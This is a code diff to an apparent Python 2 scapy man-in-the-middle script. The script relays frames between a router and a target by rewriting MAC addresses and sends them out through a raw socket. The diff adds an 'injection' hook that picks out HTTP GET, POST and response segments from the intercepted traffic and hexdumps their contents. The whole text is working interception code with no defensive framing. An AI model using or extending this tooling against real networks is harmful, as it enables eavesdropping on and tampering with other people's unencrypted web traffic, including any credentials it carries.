@@ -17,9 +17,27 @@ bpf = "host %s and ether dst host %s"%(targetip, mymac)
 
 
 def injection(x):
-    print '\n----------'
-    print repr(x)
+    #print repr(x)
+    eth = x
+    ip = x.payload
+    if ip.payload.name == 'TCP':
+        tcp = ip.payload
+        flags = tcp.flags
+        if flags & 'P': # push flag
+            t = raw(tcp.payload)
+            if t[0:4] != 'HTTP' \
+                and t[0:3] != 'GET' \
+                and t[0:4] != 'POST'  :
+                    return x
+            print '\n-----------'
+
+            print "eth\t%s -> %s"%(eth.src, eth.dst)
+            print "ip\t%s -> %s"%(ip.src, ip.dst)
+            print "tcp\t%s -> %s flags: %s"%(tcp.sport, ip.dport, tcp.flags)
+
+            print hexdump(tcp.payload)
     return x
+
 # use a global raw socket to improve performance
 sockraw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
 sockraw.bind((iface,0))
@@ -29,7 +47,7 @@ def process(x):
     c = x.command()
     if x.name == 'Ethernet':
         if x.payload.name == "IP":
-            # this is a ip package 
+            # this is an ip package 
             if x.payload.dst != myip :
                 if x.src == routermac:
                     x.dst = targetmac
@@ -40,8 +58,6 @@ def process(x):
 
                 x = injection(x)  # do some hack
 
-                #print '\n-------------'
-                #print hexdump(x)
                 try:
                     sockraw.send(raw(x))
                 except Exception,e:
